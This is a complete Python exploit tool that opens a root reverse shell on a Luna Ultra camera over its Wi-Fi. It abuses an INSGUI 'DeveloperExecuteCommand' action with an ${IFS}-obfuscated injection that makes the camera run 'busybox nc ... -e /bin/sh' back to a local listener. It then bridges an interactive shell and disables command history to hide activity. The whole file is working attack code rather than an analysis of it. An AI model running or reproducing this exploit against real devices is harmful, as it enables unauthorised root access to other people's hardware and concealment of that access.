#!/usr/bin/env python3
"""Open a temporary root shell through the Luna Ultra INSGUI bridge."""

from __future__ import annotations

import argparse
import ipaddress
import socket
import sys
import threading


DEFAULT_CAMERA = "192.168.42.1"
DEFAULT_CONTROL_PORT = 23456
DEFAULT_LISTEN_PORT = 45124


def detect_source_address(camera: str, port: int) -> str:
    """Return the local address selected by the operating system route."""
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((camera, port))
        return probe.getsockname()[0]
    finally:
        probe.close()


def build_payload(listen_host: str, listen_port: int) -> bytes:
    """Build the printf-style INSGUI action used by the camera."""
    separator = "${IFS}"
    command = separator.join(
        [
            "/bin/busybox",
            "nc",
            listen_host,
            str(listen_port),
            "-e",
            "/bin/sh",
        ]
    )
    return (
        'DeveloperExecuteCommand_Action '
        '{"DeveloperExecuteCommand":%s} '
        f"{command}\n"
    ).encode()


def send_action(camera: str, port: int, payload: bytes, timeout: float) -> str:
    """Send the action and return the bridge acknowledgement."""
    response = bytearray()
    with socket.create_connection((camera, port), timeout=timeout) as control:
        control.sendall(payload)
        control.settimeout(0.35)
        while True:
            try:
                chunk = control.recv(8192)
            except TimeoutError:
                break
            if not chunk:
                break
            response.extend(chunk)
    return response.decode("utf-8", errors="backslashreplace")


def receive_output(shell: socket.socket, stopped: threading.Event) -> None:
    """Copy camera shell output to the local terminal."""
    try:
        while True:
            data = shell.recv(16384)
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
    except OSError:
        pass
    finally:
        stopped.set()


def interactive_shell(shell: socket.socket) -> None:
    """Bridge terminal input and output to the reverse shell."""
    stopped = threading.Event()
    reader = threading.Thread(
        target=receive_output,
        args=(shell, stopped),
        daemon=True,
    )
    reader.start()

    shell.sendall(b"export HISTFILE=/dev/null; id; uname -a\n")

    try:
        while not stopped.is_set():
            line = sys.stdin.buffer.readline()
            if not line:
                break
            shell.sendall(line)
    except (KeyboardInterrupt, BrokenPipeError):
        pass
    finally:
        try:
            shell.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        shell.close()


def run_command(shell: socket.socket, command: str, timeout: float) -> int:
    """Run one command, print its output, and close the temporary shell."""
    marker = b"__LUNA_WIFI_SHELL_DONE__"
    shell.settimeout(timeout)
    shell.sendall(command.encode() + b"; printf '\n__LUNA_WIFI_SHELL_DONE__\n'; exit\n")
    output = bytearray()

    try:
        while marker not in output:
            chunk = shell.recv(16384)
            if not chunk:
                break
            output.extend(chunk)
    except TimeoutError:
        print("Timed out while waiting for command output.", file=sys.stderr)
        return 1
    finally:
        shell.close()

    clean_output = bytes(output).replace(marker, b"").strip(b"\r\n")
    if clean_output:
        sys.stdout.buffer.write(clean_output + b"\n")
    return 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Open a temporary root shell over Luna Ultra Wi-Fi."
    )
    parser.add_argument("--camera", default=DEFAULT_CAMERA)
    parser.add_argument("--control-port", type=int, default=DEFAULT_CONTROL_PORT)
    parser.add_argument("--listen-host")
    parser.add_argument("--listen-port", type=int, default=DEFAULT_LISTEN_PORT)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument(
        "--run",
        metavar="COMMAND",
        help="run one command and exit instead of opening an interactive shell",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    listen_host = args.listen_host or detect_source_address(
        args.camera, args.control_port
    )

    if args.listen_host is None:
        camera_network = ipaddress.ip_network(f"{args.camera}/24", strict=False)
        if ipaddress.ip_address(listen_host) not in camera_network:
            print(
                f"Detected source address {listen_host}, which is not on the "
                f"camera network {camera_network}. Reconnect to the camera Wi-Fi "
                "or provide --listen-host explicitly.",
                file=sys.stderr,
            )
            return 1

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((listen_host, args.listen_port))
    listener.listen(1)
    listener.settimeout(args.timeout)

    print(f"Listening on {listen_host}:{args.listen_port}", flush=True)
    payload = build_payload(listen_host, args.listen_port)
    try:
        acknowledgement = send_action(
            args.camera,
            args.control_port,
            payload,
            args.timeout,
        )
    except OSError as error:
        listener.close()
        print(
            f"Could not connect to {args.camera}:{args.control_port}: {error}",
            file=sys.stderr,
        )
        return 1
    if acknowledgement:
        print("INSGUI acknowledgement:", flush=True)
        print(acknowledgement.rstrip(), flush=True)

    try:
        shell, peer = listener.accept()
    except TimeoutError:
        print("No reverse shell connection was received.", file=sys.stderr)
        return 1
    finally:
        listener.close()

    print(f"Shell connected from {peer[0]}:{peer[1]}", flush=True)

    if args.run:
        return run_command(shell, args.run, args.timeout)

    print("Press Ctrl-C or send EOF to close the temporary shell.")
    interactive_shell(shell)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
